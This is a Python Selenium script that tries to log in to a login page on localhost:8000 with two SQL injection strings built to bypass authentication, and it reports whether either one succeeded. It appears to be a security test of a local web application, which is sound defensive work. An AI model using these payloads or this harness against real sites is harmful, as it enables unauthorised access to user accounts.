from selenium import webdriver
from selenium.common import UnexpectedAlertPresentException
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.action_chains import ActionChains

import time


def try_sqlinj(user_name, password):
    driver = webdriver.Chrome()

    driver_url = 'http://localhost:8000/Login.php'
    driver.get(driver_url)

    time.sleep(1)  # wait for the page to load

    # Find and fill the fields with desired values
    input_elements = driver.find_elements(By.TAG_NAME, "input")
    input_elements = [element for element in input_elements if element.is_displayed()]

    input_elements[0].send_keys(user_name)  # Enter the username
    input_elements[1].send_keys(password)  # Enter password

    # Find and click the submit button
    button_elements = driver.find_elements(By.TAG_NAME, "button")
    button_elements = [element for element in button_elements if element.is_displayed() and
                       (element.get_attribute("type") == "submit" or element.get_attribute("disabled type") == "submit")]
    button_elements[-1].click()

    time.sleep(1) # wait for the page to load

    try:
        # don't work when there is a popup
        actions = ActionChains(driver)
        actions.send_keys(Keys.ESCAPE)  # Escape popups
        actions.perform()
    except UnexpectedAlertPresentException:
        alert = driver.switch_to.active_element  # closing the popup


    time.sleep(0.5)
    new_url = driver.current_url
    passed = False
    if driver_url != new_url:
        passed = True

    # Close the browser window
    driver.quit()
    return passed


injections = [['a@a.a\'/*', '\'*/\''], ['a@a.a\'-- ', '']]
for injection in injections:
    passed = try_sqlinj(injection[0], injection[1])
    if passed:
        print('sql injection succeeded')
        exit(0)
print('sql injection failed')



